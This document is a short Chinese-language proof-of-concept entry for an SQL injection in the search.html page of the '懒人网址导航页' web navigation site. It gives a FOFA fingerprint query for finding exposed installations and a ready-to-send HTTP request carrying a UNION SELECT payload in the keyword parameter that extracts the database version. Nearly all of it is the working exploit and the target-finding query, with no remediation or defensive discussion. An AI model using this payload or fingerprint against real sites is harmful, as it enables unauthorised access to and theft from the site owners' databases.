## 懒人网址导航页search.html存在SQL注入漏洞



## fofa

```
body="./templates/antidote/css/style.css"
```



## poc

```
GET /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,version(),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: keep-alive
```

